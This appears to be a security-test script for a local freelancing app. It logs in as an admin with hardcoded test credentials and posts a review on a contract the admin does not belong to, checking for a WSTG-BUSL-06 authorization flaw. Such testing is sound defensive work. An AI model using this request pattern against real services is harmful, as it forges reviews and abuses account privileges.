"""
WSTG-BUSL-06: Non-participants can review arbitrary contracts.
Expected: an admin creates a review on a contract they do not own.
"""
import requests

BASE = "http://localhost:3000"
FREELANCER_ID = "3fcfb3b4-8335-4b13-b813-3d425c3ecf7e"

admin = requests.post(f"{BASE}/api/auth/login", json={
    "email": "bob.admin@hireflow.com",
    "password": "password123",
}, timeout=10).json()

review = requests.post(f"{BASE}/api/reviews", headers={
    "Authorization": f"Bearer {admin['token']}",
}, json={
    "contract_id": "29c1f280-a139-4f25-8b90-1bf2ad2ff068",
    "reviewee_id": FREELANCER_ID,
    "rating": 5,
    "comment": "Admin can review a foreign contract",
}, timeout=10)

print("Status:", review.status_code)
print("Body:", review.text[:180])
assert review.status_code == 201
print("\n[VULNERABLE] Review workflow does not enforce contract participation")
